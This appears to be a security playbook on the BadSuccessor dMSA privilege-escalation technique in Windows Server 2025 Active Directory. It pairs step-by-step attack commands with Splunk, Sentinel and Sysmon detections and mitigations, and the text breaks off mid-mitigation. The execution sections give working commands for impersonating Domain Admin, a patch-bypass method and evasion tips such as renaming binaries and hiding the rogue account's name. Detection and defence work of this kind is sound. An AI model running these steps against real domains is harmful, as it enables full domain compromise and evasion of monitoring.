# [EMERGING-PE-001]: BadSuccessor dMSA Abuse

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | EMERGING-PE-001 |
| **MITRE ATT&CK v18.1** | [T1548 - Abuse Elevation Control Mechanism](https://attack.mitre.org/techniques/T1548/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Windows AD (Server 2025+) |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Windows Server 2025 only (dMSA feature) |
| **Patched In** | Partial mitigation in July 2025 KDC updates; Full mitigation requires dMSA attribute validation policies |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

- **Concept:** BadSuccessor is a privilege escalation attack that exploits the delegated Managed Service Account (dMSA) migration mechanism introduced in Windows Server 2025. An attacker with CreateChild permissions on an Organizational Unit (OU) can create a weaponized dMSA and manipulate the `msDS-ManagedAccountPrecededByLink` and `msDS-DelegatedMSAState` attributes to impersonate high-privilege accounts (including Domain Admins). By establishing a "successor" relationship between the malicious dMSA and the target account, the attacker inherits the target's Kerberos privileges without cracking hashes, resetting passwords, or creating golden tickets—making the attack stealthy and difficult to detect without attribute monitoring.

- **Attack Surface:** Active Directory dMSA objects, specifically the migration-related attributes (`msDS-ManagedAccountPrecededByLink`, `msDS-DelegatedMSAState`, `msDS-SupersededManagedAccountLink`, `msDS-SupersededServiceAccountState`, `msDS-GroupMSAMembership`) on both dMSA and target user accounts.

- **Business Impact:** **Complete domain compromise.** An attacker can elevate from CreateChild on a single OU to impersonating any user account in the domain, including Domain Admins, granting them full control over Active Directory, all domain-joined systems, and sensitive enterprise resources.

- **Technical Context:** The attack typically takes 10–30 minutes to execute if permissions are already established. Detection relies on monitoring attribute changes on both the dMSA and target account; without dedicated attribute-level auditing, the attack may go undetected for days or weeks. The attack is most effective against organizations that have adopted Windows Server 2025 but have not implemented dMSA attribute monitoring or restriction policies.

### Operational Risk

- **Execution Risk:** High – Requires modifications to multiple Active Directory attributes; these changes are permanent until reversed and will trigger KDC validation in patched environments.
- **Stealth:** Medium – Pre-patch: No golden ticket, no hash cracking, no LSASS access; Post-patch: KDC validation logs the blocked impersonation attempts (Event IDs 4768/4769), but initial attribute edits leave minimal traces in default logging.
- **Reversibility:** No – Once the dMSA is created and attributes are modified, restoring the original state requires manual cleanup and domain knowledge. The target account's privileges remain intact but can be re-compromised if the dMSA still exists.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.2.5.1 | Limit membership in the Domain Admins group; audit service account delegation |
| **DISA STIG** | W-25-000131 | Restrict account creation capabilities to authorized administrative personnel |
| **CISA SCuBA** | AD-2.7 | Implement continuous monitoring of privileged account activity and attribute changes |
| **NIST 800-53** | AC-2(1) – AC-2(2) | Account Management – Privileged Access Management |
| **GDPR** | Art. 32 | Security of Processing – Implement technical controls to prevent privilege escalation |
| **DORA** | Art. 9 | Protection and Prevention – Reduce privilege levels to minimum required |
| **NIS2** | Art. 21 | Cyber Risk Management Measures – Access control and privilege management |
| **ISO 27001** | A.9.2.1 – A.9.2.5 | User Access Management – Restrict privilege elevation |
| **ISO 27005** | Risk Scenario | Compromise of high-privilege accounts via attribute manipulation |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** `CreateChild` on an OU containing dMSA accounts (or ability to create dMSA accounts), OR existing compromised dMSA account with permissions to write `msDS-ManagedAccountPrecededByLink`, `msDS-DelegatedMSAState`, `msDS-SupersededManagedAccountLink`, and `msDS-SupersededServiceAccountState` on target account.
- **Required Access:** Network access to a Domain Controller (LDAP on port 389/636 or via ADSI/PowerShell from a domain-joined machine).

**Supported Versions:**
- **Windows:** Server 2025 (dMSA feature only; not available in 2016, 2019, 2022)
- **PowerShell:** 5.1+ with ActiveDirectory module
- **Tools:** SharpSuccessor, BloodHound (for enumerating CreateChild permissions), PowerShell DSC, custom C# LDAP tools

**Tools:**
- [SharpSuccessor](https://github.com/ibaiC/BadSuccessor) (dMSA attribute manipulation tool)
- [BadSuccessor PoC](https://github.com/Yuval-Gordon1/BadSuccessor) (Original Akamai research)
- [Rubeus](https://github.com/GhostPack/Rubeus) (Kerberos ticket extraction)
- PowerShell ActiveDirectory Module (Microsoft.ActiveDirectory.Management)
- [BloodHound Community Edition](https://github.com/SpecterOps/BloodHound) (Privilege enumeration)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

#### Step 1: Enumerate dMSA Accounts in the Domain

```powershell
# Query for all dMSA accounts
Get-ADUser -Filter {objectClass -eq "dMSA"} -Properties msDS-DelegatedMSAState, msDS-ManagedAccountPrecededByLink, msDS-SupersededManagedAccountLink

# Alternative: Using LDAP filter
Get-ADObject -LDAPFilter "(objectClass=dMSA)" -Properties *
```

**What to Look For:**
- Presence of dMSA accounts (objectClass = dMSA)
- Migration state (`msDS-DelegatedMSAState` = 1 or 2)
- Existing "predecessor" relationships (`msDS-ManagedAccountPrecededByLink` populated)
- OUs where dMSA accounts reside (target for OU-level permissions)

**Command (Server 2025+):**

```powershell
# Windows Server 2025 provides native dMSA cmdlets
Get-ADServiceAccount -Filter {objectClass -eq "dMSA"} -Properties *
```

#### Step 2: Check CreateChild Permissions on Interesting OUs

```powershell
# Enumerate OUs and their ACLs for CreateChild permissions
$OU = Get-ADOrganizationalUnit -Filter * | Select-Object DistinguishedName

foreach ($o in $OU) {
    $ACL = Get-Acl "AD:\$($o.DistinguishedName)"
    $CreateChildRules = $ACL.Access | Where-Object {
        $_.ObjectType -eq "00000000-0000-0000-0000-000000000000" -and $_.ActiveDirectoryRights -like "*CreateChild*"
    }
    if ($CreateChildRules) {
        Write-Host "OU: $($o.DistinguishedName) has CreateChild permissions:"
        $CreateChildRules | ForEach-Object { Write-Host "  - $($_.IdentityReference)" }
    }
}
```

**What to Look For:**
- OUs where unprivileged users or group-managed service accounts have CreateChild rights
- Target OUs containing high-value service accounts (Exchange, SQL, backup agents)

#### Step 3: Identify High-Value Target Accounts

```powershell
# Query for high-privilege service accounts
Get-ADUser -Filter {(ServicePrincipalName -like "*") -and (Enabled -eq $true)} -Properties ServicePrincipalName, AccountDisabled | Select-Object SamAccountName, ServicePrincipalName
```

**What to Look For:**
- Service accounts with SPNs
- Domain Admin group members
- Accounts with high-privilege group membership

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Using SharpSuccessor Tool (Automated)

**Supported Versions:** Windows Server 2025

#### Step 1: Compile/Obtain SharpSuccessor

**Objective:** Prepare the exploitation tool for attribute manipulation.

**Command:**

```bash
git clone https://github.com/ibaiC/BadSuccessor.git
cd BadSuccessor
# Compile C# code
csc.exe /target:exe /out:SharpSuccessor.exe *.cs
```

**Expected Output:**

```
Compilation successful. Output: SharpSuccessor.exe
```

**What This Means:**
- The tool is ready for dMSA attribute manipulation
- Requires .NET Framework 4.5+

**OpSec & Evasion:**
- Compile on the attacker's machine, not the target
- Use obfuscation or rename the binary to avoid signature-based detection
- Execute from C:\Windows\Temp or other low-monitoring directories
- Detection likelihood: Medium (Event ID 4688 logs child process creation; EDR may flag the binary)

**Troubleshooting:**
- **Error:** "csc.exe not found"
  - **Cause:** .NET Framework not installed
  - **Fix:** Install .NET Framework 4.5+ or use Visual Studio compiler

#### Step 2: Create Malicious dMSA Account in Target OU

**Objective:** Establish a foothold dMSA that will be linked to the target privilege account.

**Command:**

```powershell
# Create a new dMSA in an OU where you have CreateChild permissions
New-ADServiceAccount -Name "EMERGENT_DMSA" `
  -DNSHostName "attacker-dmsa.yourdomain.local" `
  -Path "OU=DangeroOUs,DC=yourdomain,DC=local" `
  -Enabled $true
```

**Expected Output:**

```
Name              SamAccountName               DistinguishedName
----              --------------               -----------------
EMERGENT_DMSA     EMERGENT_DMSA$               CN=EMERGENT_DMSA,OU=DangerousOUs,DC=yourdomain,DC=local
```

**What This Means:**
- A new dMSA object has been created in Active Directory
- The SamAccountName is EMERGENT_DMSA$ (note the dollar sign, which is standard for dMSA accounts)

**OpSec & Evasion:**
- Use a name that blends with existing service accounts (e.g., SQL_SERVICE_DMSA, BACKUP_DMSA)
- Avoid suspicious naming patterns like ATTACKER_DMSA or PWNED_DMSA
- Detection likelihood: Low (object creation logs to Event ID 5136; without attribute-level monitoring, easily missed)

**Troubleshooting:**
- **Error:** "You do not have permission to create dMSA objects in this OU"
  - **Cause:** CreateChild not granted
  - **Fix:** Escalate privileges or find a different OU where you have CreateChild

#### Step 3: Identify and Link Target Account

**Objective:** Establish the "successor" relationship between the malicious dMSA and the target privilege account.

**Command (Using SharpSuccessor):**

```powershell
# Identify target account (e.g., Domain Admin)
$TargetAccount = Get-ADUser -Identity "Administrator" -Properties *
$TargetDN = $TargetAccount.DistinguishedName

# Manipulate dMSA attributes to link to target
.\SharpSuccessor.exe add /impersonate:Administrator `
  /path:"OU=DangerousOUs,DC=yourdomain,DC=local" `
  /account:EMERGENT_DMSA `
  /name:"EMERGENT_DMSA"
```

**Expected Output (Pre-Patch):**

```
[+] Successfully created dMSA: EMERGENT_DMSA$
[+] Linked to target: Administrator
[+] Set msDS-DelegatedMSAState: 2 (Migration Completed)
[+] Set msDS-ManagedAccountPrecededByLink: CN=Administrator,CN=Users,DC=yourdomain,DC=local
[+] Ready to request impersonation tickets
```

**Expected Output (Post-Patch - July 2025+):**

```
[-] KDC validation failed: msDS-SupersededManagedAccountLink not found on target
[-] Attack aborted (this is the KDC validation enforcement)
```

**What This Means:**
- Pre-patch: The dMSA is now linked to the target account; Kerberos will issue impersonation tickets
- Post-patch: The KDC now validates that the target account's `msDS-SupersededManagedAccountLink` attribute also references the dMSA, preventing one-sided linkage

**OpSec & Evasion:**
- This attribute modification is logged to Event ID 5136 (Directory Service Changes)
- Without attribute-level SIEM filtering, the event is buried in high-volume logs
- Detection likelihood: Medium (requires dedicated dMSA attribute monitoring)

**Troubleshooting:**
- **Error:** "Failed to modify msDS-ManagedAccountPrecededByLink"
  - **Cause:** Insufficient write permissions on the dMSA object
  - **Fix:** Ensure you have WRITE access on the dMSA attributes
- **Error:** "KDC validation failed" (July 2025+)
  - **Cause:** KDC enforcement of mutual attribute validation
  - **Fix:** Also write to `msDS-SupersededManagedAccountLink` on the target account (requires GenericWrite on target)

#### Step 4: Request Impersonation Ticket (Pre-Patch Only)

**Objective:** Extract a Kerberos ticket issued to the dMSA but with the target account's privileges.

**Command (Using Rubeus):**

```powershell
# Retrieve Kerberos ticket for the dMSA
.\Rubeus.exe asktgt /user:EMERGENT_DMSA$ /domain:yourdomain.local /dc:DC01.yourdomain.local
```

**Expected Output (Pre-Patch):**

```
[*] Using current credentials to request a TGT...
[+] Ticket retrieved: EMERGENT_DMSA$@yourdomain.local
[+] Special note: This ticket contains Administrator's SID in the authorization data
[+] Ticket saved to: EMERGENT_DMSA$@yourdomain.local.kirbi
```

**What This Means:**
- The KDC has issued a TGT to the dMSA that includes the target account's (Administrator's) SID and group memberships
- This ticket can be used to access resources as Administrator without knowing the Administrator's password

**OpSec & Evasion:**
- This generates Event IDs 4768 (AS-REQ) and 4769 (TGS-REQ) on the DC
- Look for unusual TGT requests to dMSA accounts followed by rapid service tickets
- Detection likelihood: High (unusual Kerberos patterns, especially dMSA → high-privilege tickets)

**Troubleshooting:**
- **Error:** "KRB_ERR_GENERIC" (July 2025+)
  - **Cause:** KDC rejection due to missing mutual attribute validation
  - **Fix:** This is the patched behavior; attack fails

#### Step 5: Access Resources as Target Account (Pre-Patch Only)

**Objective:** Demonstrate privilege escalation by accessing administrative shares.

**Command:**

```powershell
# Use the impersonation ticket to access admin shares
dir \\DC01.yourdomain.local\c$
dir \\SERVER02.yourdomain.local\c$
```

**Expected Output:**

```
Directory of \\DC01.yourdomain.local\c$

01/10/2026  10:15 AM    <DIR>          Program Files
01/10/2026  10:14 AM    <DIR>          Windows
01/10/2026  10:13 AM    <DIR>          Users

--- (Full access, previously denied)
```

**What This Means:**
- The impersonation ticket is valid and grants access to administrative resources
- Privilege escalation is successful

---

### METHOD 2: Manual LDAP Manipulation (PowerShell)

**Supported Versions:** Windows Server 2025

#### Step 1: Create dMSA via LDAP

**Objective:** Establish dMSA without using native cmdlets.

**Command:**

```powershell
$DN_OU = "OU=Services,DC=yourdomain,DC=local"
$dMSA_Name = "STEALTHY_SVC"
$dMSA_DN = "CN=$dMSA_Name,OU=Services,DC=yourdomain,DC=local"

# Create dMSA via LDAP
$Entry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dMSA_DN")
$Entry.Properties["objectClass"].Value = @("dMSA", "user")
$Entry.Properties["sAMAccountName"].Value = "$dMSA_Name`$"
$Entry.Properties["msDS-DelegatedMSAState"].Value = 1
$Entry.CommitChanges()
```

**Expected Output:**

```
(No console output on success; object committed to AD)
```

**What This Means:**
- dMSA has been created at the LDAP level
- Can be less detectable than PowerShell cmdlets if logging is not configured

**OpSec & Evasion:**
- Direct LDAP operations may bypass PowerShell logging if PS remoting is not used
- Still logged to Event ID 5136 in Directory Service
- Detection likelihood: Low-Medium

**Troubleshooting:**
- **Error:** "Path does not exist"
  - **Cause:** OU does not exist or incorrect DN syntax
  - **Fix:** Verify OU path with `Get-ADOrganizationalUnit`

#### Step 2: Set Migration Attributes via LDAP

**Objective:** Link the dMSA to the target account by modifying AD attributes.

**Command:**

```powershell
$dMSA_DN = "CN=STEALTHY_SVC,OU=Services,DC=yourdomain,DC=local"
$Target_DN = "CN=Administrator,CN=Users,DC=yourdomain,DC=local"

# Modify dMSA attributes
$dMSAEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dMSA_DN")
$dMSAEntry.Properties["msDS-ManagedAccountPrecededByLink"].Value = $Target_DN
$dMSAEntry.Properties["msDS-DelegatedMSAState"].Value = 2  # Completed migration
$dMSAEntry.CommitChanges()

# Also modify target account (if you have GenericWrite on it)
$TargetEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Target_DN")
$TargetEntry.Properties["msDS-SupersededManagedAccountLink"].Value = $dMSA_DN
$TargetEntry.CommitChanges()
```

**Expected Output:**

```
(Object updated; no console output)
```

**What This Means:**
- Attributes set; dMSA is now the "successor" of the Administrator account
- Pre-patch: KDC will issue impersonation tickets
- Post-patch: KDC will validate mutual linkage and may reject if not properly established

**OpSec & Evasion:**
- Both attributes modified in a single script; logged as separate Event ID 5136 entries
- If script execution is rapid, may appear as a coordinated attack
- Detection likelihood: Medium-High (attribute correlation)

**Troubleshooting:**
- **Error:** "Access Denied"
  - **Cause:** Insufficient write permissions on target account
  - **Fix:** Ensure you have GenericWrite or Attribute-specific write on both objects

---

### METHOD 3: Post-Patch Exploitation (July 2025+)

**Supported Versions:** Windows Server 2025 with July 2025+ KDC patches

#### Step 1: Establish Bidirectional Linkage

**Objective:** Overcome KDC validation by ensuring both accounts reference each other.

**Command:**

```powershell
$dMSA_DN = "CN=BILINKED_SVC,OU=Services,DC=yourdomain,DC=local"
$Target_DN = "CN=Administrator,CN=Users,DC=yourdomain,DC=local"

# Step 1: Modify dMSA to reference target
$dMSAEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dMSA_DN")
$dMSAEntry.Properties["msDS-ManagedAccountPrecededByLink"].Value = $Target_DN
$dMSAEntry.Properties["msDS-DelegatedMSAState"].Value = 2
$dMSAEntry.CommitChanges()

# Step 2: Modify target to reference dMSA
# (Requires GenericWrite or Attribute-Write permission on target)
$TargetEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Target_DN")
$TargetEntry.Properties["msDS-SupersededManagedAccountLink"].Value = $dMSA_DN
$TargetEntry.CommitChanges()

Write-Host "[+] Bidirectional linkage established"
```

**Expected Output:**

```
[+] Bidirectional linkage established
```

**What This Means:**
- Both attributes now reference each other; KDC validation will pass
- Impersonation tickets can now be requested

**OpSec & Evasion:**
- Requires two separate attribute writes
- If target account has strict ACLs, this may fail
- Detection likelihood: High (bidirectional linkage is a red flag for monitoring tools)

**Troubleshooting:**
- **Error:** "Access Denied on target account"
  - **Cause:** Insufficient permissions to write to `msDS-SupersededManagedAccountLink` on target
  - **Fix:** Exploit an account privilege escalation first (e.g., through other PE vectors) to gain write access

---

## 6. ATTACK SIMULATION & VERIFICATION (Atomic Red Team)

#### Atomic Red Team Test

- **Atomic Test ID:** [Not yet cataloged in official Atomic tests; community PoCs available]
- **Test Name:** dMSA Privilege Escalation via BadSuccessor
- **Description:** Simulates the creation of a malicious dMSA and its linkage to a high-privilege account to test detection and response capabilities.
- **Supported Versions:** Windows Server 2025
- **Recommended Test Commands:**

```powershell
# Simulate dMSA creation
New-ADServiceAccount -Name "TEST_DMSA_PoC" -Path "OU=Test,DC=yourdomain,DC=local" -Enabled $true

# Simulate attribute modification for detection testing
# (Use Get-ADServiceAccount to verify creation)
Get-ADServiceAccount -Identity "TEST_DMSA_PoC" -Properties msDS-DelegatedMSAState
```

- **Cleanup Command:**

```powershell
# Remove test dMSA
Remove-ADServiceAccount -Identity "TEST_DMSA_PoC" -Confirm:$false
```

**Reference:** [Atomic Red Team - Active Directory Tests](https://github.com/redcanaryco/atomic-red-team)

---

## 7. TOOLS & COMMANDS REFERENCE

#### [SharpSuccessor](https://github.com/ibaiC/BadSuccessor)

**Version:** 1.0+
**Minimum Version:** 1.0
**Supported Platforms:** Windows Server 2025

**Version-Specific Notes:**
- Version 1.0 (Pre-Patch): Exploits dMSA attributes without KDC validation checks
- Version 1.0+ (Post-Patch Aware): Includes bidirectional linkage setup to overcome July 2025 KDC patches

**Installation:**

```bash
git clone https://github.com/ibaiC/BadSuccessor.git
cd BadSuccessor
csc.exe /target:exe /out:SharpSuccessor.exe *.cs
```

**Usage:**

```powershell
.\SharpSuccessor.exe add /impersonate:TargetUser /path:"OU=Services,DC=yourdomain,DC=local" /account:dMSA_Account /name:"dMSA_Name"
```

#### [BadSuccessor PoC (Akamai Research)](https://github.com/Yuval-Gordon1/BadSuccessor)

**Version:** Initial research (May 2025)
**Supported Platforms:** Windows Server 2025

**Installation:**

```bash
git clone https://github.com/Yuval-Gordon1/BadSuccessor.git
```

**Usage:** Research/educational reference; demonstrates attribute manipulation techniques

#### [Rubeus](https://github.com/GhostPack/Rubeus)

**Version:** 1.6.4+
**Supported Platforms:** .NET 4.5+ environments

**Installation:**

```bash
# Pre-compiled binaries available at:
# https://github.com/GhostPack/Rubeus/releases
```

**Usage (Kerberos Ticket Extraction):**

```powershell
.\Rubeus.exe asktgt /user:dMSA_Account$ /domain:yourdomain.local /dc:DC01.yourdomain.local
```

#### Script (One-Liner - Attribute Enumeration)

```powershell
Get-ADObject -LDAPFilter "(msDS-DelegatedMSAState=*)" -Properties msDS-ManagedAccountPrecededByLink, msDS-DelegatedMSAState, msDS-SupersededManagedAccountLink | Select-Object Name, msDS-DelegatedMSAState, msDS-ManagedAccountPrecededByLink
```

---

## 8. SPLUNK DETECTION RULES

#### Rule 1: dMSA Attribute Modification Detection

**Rule Configuration:**
- **Required Index:** wineventlog (Windows Security)
- **Required Sourcetype:** WinEventLog:Security
- **Required Fields:** EventCode, ObjectName, AttributeLDAPDisplayName, ObjectDN
- **Alert Threshold:** > 0 events (any dMSA attribute change is suspicious)
- **Applies To Versions:** All (monitors Event ID 5136)

**SPL Query:**

```spl
index=wineventlog sourcetype=WinEventLog:Security EventCode=5136
(AttributeLDAPDisplayName="msDS-ManagedAccountPrecededByLink" OR
 AttributeLDAPDisplayName="msDS-DelegatedMSAState" OR
 AttributeLDAPDisplayName="msDS-SupersededManagedAccountLink" OR
 AttributeLDAPDisplayName="msDS-SupersededServiceAccountState" OR
 AttributeLDAPDisplayName="msDS-GroupMSAMembership")
| stats count, values(SubjectUserName) as Editor, values(NewValue) as NewValue by ObjectDN, AttributeLDAPDisplayName
| where count > 0
```

**What This Detects:**
- Line 1-2: Filters Windows Security event logs
- Line 3-7: Identifies changes to the four critical dMSA migration attributes
- Line 8-9: Groups by modified object and attribute name, showing who made the change and what value was set
- Detects: Any modification of dMSA migration attributes, even if the change is legitimate

**Manual Configuration Steps:**

1. Log into Splunk Web → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **New Alert**
4. Paste the SPL query above
5. Set **Trigger Condition** to: **custom** → `count > 0`
6. Configure **Action** → **Email** → Add SOC email list
7. Click **Save**

**False Positive Analysis:**
- **Legitimate Activity:** dMSA migration by authorized administrators using `Complete-ADServiceAccountMigration`
- **Benign Tools:** Native Windows Server 2025 dMSA cmdlets (Get-ADServiceAccount, Start-ADServiceAccountMigration)
- **Tuning:** Exclude known service account admin accounts with: `| where SubjectUserName!="svc_admin" AND SubjectUserName!="AD_Automation"`

---

## 9. MICROSOFT SENTINEL DETECTION

#### Query 1: dMSA Migration Attributes Detection

**Rule Configuration:**
- **Required Table:** AuditLogs (Azure AD operations) + SecurityEvent (on-premises DC logs)
- **Required Fields:** OperationName, InitiatedBy, TargetResources, ModifiedProperties
- **Alert Severity:** High
- **Frequency:** Run every 10 minutes
- **Applies To Versions:** Azure AD integration with on-premises; Windows Server 2025 DCs

**KQL Query:**

```kusto
AuditLogs
| where OperationName contains "Update" and TargetResources contains "dMSA"
| where AdditionalDetails contains "msDS-ManagedAccountPrecededByLink" 
    or AdditionalDetails contains "msDS-DelegatedMSAState"
    or AdditionalDetails contains "msDS-SupersededManagedAccountLink"
| project TimeGenerated, InitiatedBy=parse_json(InitiatedBy)[0].userPrincipalName, TargetObjectId=TargetResources[0].id, ModifiedProperties
| join (
    AuditLogs
    | where OperationName == "Update user"
    | project TargetObjectId=TargetResources[0].id, HighPrivilegeGroup=iff(TargetResources[0].displayName contains "Admin" or TargetResources[0].displayName contains "Domain Admins", "Yes", "No")
) on TargetObjectId
| where HighPrivilegeGroup == "Yes"
```

**What This Detects:**
- Line 1-2: Queries Azure AD audit logs for dMSA update operations
- Line 3-5: Filters for the four critical attributes being modified
- Line 6-8: Extracts who made the change and what was modified
- Line 9-14: Cross-references the modified account with Azure AD to identify if it's a high-privilege account
- Detects: Modifications to dMSA attributes targeting high-privilege user accounts (potential BadSuccessor activity)

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `dMSA Privilege Escalation Detection (BadSuccessor)`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `10 minutes`
   - Lookup data from the last: `2 hours`
6. **Incident settings Tab:**
   - Enable **Create incidents from alerts**
7. Click **Review + create**

**Manual Configuration Steps (PowerShell):**

```powershell
# Connect to Sentinel
Connect-AzAccount
$ResourceGroup = "YourResourceGroup"
$WorkspaceName = "YourSentinelWorkspace"

# Create the analytics rule
New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup -WorkspaceName $WorkspaceName `
  -DisplayName "dMSA Privilege Escalation Detection" `
  -Query @"
AuditLogs
| where OperationName contains "Update" and TargetResources contains "dMSA"
| where AdditionalDetails contains "msDS-ManagedAccountPrecededByLink"
"@ `
  -Severity "High" `
  -Enabled $true
```

**Source:** [Microsoft Sentinel AD/Entra ID Detection Reference](https://learn.microsoft.com/en-us/azure/sentinel/)

---

## 10. WINDOWS EVENT LOG MONITORING

**Event ID: 5136 (Directory Service Object Modified)**
- **Log Source:** Security
- **Trigger:** Any modification to dMSA or user account attributes
- **Filter:** `EventID=5136` AND (`AttributeLDAPDisplayName contains "msDS-ManagedAccountPrecededByLink"` OR `AttributeLDAPDisplayName contains "msDS-DelegatedMSAState"`)
- **Applies To Versions:** Windows Server 2012 R2+ (5136 available on all domain controllers)

**Additional Event IDs:**
- **4768 (Kerberos AS-REQ):** Look for TGT requests to dMSA accounts (dMSA$ accounts requesting tickets)
- **4769 (Kerberos TGS-REQ):** Look for service tickets issued to dMSA accounts followed by high-privilege service access (LDAP, HOST, etc.)

**Manual Configuration Steps (Group Policy - Domain Controllers):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **DS Access**
3. Enable: **Audit Directory Service Changes**
4. Set to: **Success and Failure**
5. Apply to all Domain Controllers via Group Policy
6. Run `gpupdate /force` on target DCs

**Manual Configuration Steps (Server 2025 - Local Policy):**

1. Open **Local Security Policy** (secpol.msc) on Domain Controller
2. Navigate to **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **DS Access**
3. Right-click **Audit Directory Service Changes** → **Properties**
4. Enable **Success** and **Failure**
5. Click **OK**
6. Audit logging will begin immediately

**Custom Windows Event Viewer Filter:**

1. Open **Event Viewer**
2. Right-click **Windows Logs** → **Security**
3. Click **Filter Current Log**
4. **Event ID:** 5136
5. **<AND>**
6. **XML:** Add custom filter for attribute names:

```xml
<QueryList>
  <Query Id="0" Path="Security">
    <Select Path="Security">*[System[(EventID=5136)]] and *[EventData[Data[@Name='AttributeLDAPDisplayName']='msDS-ManagedAccountPrecededByLink' or Data[@Name='AttributeLDAPDisplayName']='msDS-DelegatedMSAState' or Data[@Name='AttributeLDAPDisplayName']='msDS-SupersededManagedAccountLink']]</Select>
  </Query>
</QueryList>
```

---

## 11. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Windows Server 2025 Domain Controllers

```xml
<Sysmon schemaversion="4.22">
  <RuleGroup name="dMSA Attribute Monitoring" groupRelation="or">
    <!-- Monitor for LDAP modification operations targeting dMSA -->
    <ProcessCreate onmatch="include">
      <Image condition="image">dsdbutil.exe</Image>
      <CommandLine condition="contains">dMSA</CommandLine>
    </ProcessCreate>
    
    <!-- Monitor for PowerShell attribute modifications -->
    <ProcessCreate onmatch="include">
      <Image condition="image">powershell.exe</Image>
      <CommandLine condition="contains any">
        msDS-ManagedAccountPrecededByLink;
        msDS-DelegatedMSAState;
        msDS-SupersededManagedAccountLink;
        Replace-ADObjectProperty;
        Set-ADObject -Replace
      </CommandLine>
    </ProcessCreate>
    
    <!-- Monitor for suspicious LDAP queries from non-DC systems -->
    <NetworkConnect onmatch="include">
      <DestinationPort>389</DestinationPort>
      <DestinationIp condition="is not">10.0.0.0/8;172.16.0.0/12;192.168.0.0/16</DestinationIp>
      <Protocol>tcp</Protocol>
    </NetworkConnect>
  </RuleGroup>
</Sysmon>
```

**Manual Configuration Steps:**

1. Download Sysmon from [Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create a config file `sysmon-dmsa-config.xml` with the XML above
3. Install Sysmon:

```cmd
sysmon64.exe -accepteula -i sysmon-dmsa-config.xml
```

4. Verify installation:

```powershell
Get-Service Sysmon64
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10 | Format-Table TimeCreated, Message
```

---

## 12. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alert: Suspicious dMSA Migration Activity

**Alert Name:** "Potential privilege escalation via delegated managed service account (dMSA) migration"
- **Severity:** Critical
- **Description:** Microsoft Defender for Cloud detects unusual dMSA attribute modifications that may indicate a BadSuccessor privilege escalation attempt
- **Applies To:** Azure AD Premium P2 + Defender for Cloud enabled subscriptions
- **Remediation:**

1. Immediately review the impacted dMSA and target account in Azure Portal
2. Verify that the attribute changes were authorized by your service account management team
3. If unauthorized, reverse the attribute changes:

```powershell
# Clear malicious linkage
$dMSA_DN = "CN=SUSPECT_DMSA,OU=Services,DC=yourdomain,DC=local"
$dMSAEntry = Get-ADObject -Identity $dMSA_DN -Properties msDS-ManagedAccountPrecededByLink
$dMSAEntry.msDS-ManagedAccountPrecededByLink = $null
Set-ADObject -Instance $dMSAEntry
```

4. Force re-authentication for all users who accessed resources via the impacted accounts
5. Review Kerberos ticket events (Event IDs 4768/4769) for the time period of the suspicious activity

**Manual Configuration Steps (Enable Defender for Cloud):**

1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Defender for Servers**: ON
   - **Defender for Identity**: ON
5. Click **Save**
6. Configure **Alert rules** to trigger on dMSA modifications:
   - Go to **Alert rules** (Preview) → Add custom rule filtering for Event ID 5136

**Reference:** [Microsoft Defender for Cloud Alerts](https://learn.microsoft.com/en-us/azure/defender-for-cloud/alerts-overview)

---

## 13. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

*   **Implement Strict ACL Controls on dMSA OUs:**
    - Limit CreateChild permissions to a dedicated service account management group
    - Review all OUs with dMSA accounts and remove CreateChild from non-administrative users
    
    **Applies To Versions:** Windows Server 2025
    
    **Manual Steps (PowerShell):**
    
    ```powershell
    # Find all OUs containing dMSA accounts
    Get-ADOrganizationalUnit -Filter * | ForEach-Object {
        $OU = $_
        $dMSACount = @(Get-ADObject -SearchBase $OU.DistinguishedName -Filter "(objectClass=dMSA)").Count
        if ($dMSACount -gt 0) {
            Write-Host "OU: $($OU.Name) contains $dMSACount dMSA accounts"
            
            # Remove CreateChild from potentially dangerous groups
            $ACL = Get-Acl "AD:\$($OU.DistinguishedName)"
            $RulesToRemove = $ACL.Access | Where-Object {
                $_.ActiveDirectoryRights -like "*CreateChild*" -and
                $_.IdentityReference -notlike "*Domain Admins*" -and
                $_.IdentityReference -notlike "*Enterprise Admins*"
            }
            $RulesToRemove | ForEach-Object {
                $ACL.RemoveAccessRule($_)
                Write-Host "Removed CreateChild: $($_.IdentityReference)"
            }
            Set-Acl -Path "AD:\$($OU.DistinguishedName)" -AclObject $ACL
        }
    }
    ```
    
    **Manual Steps (Active Directory Users and Computers GUI):**
    
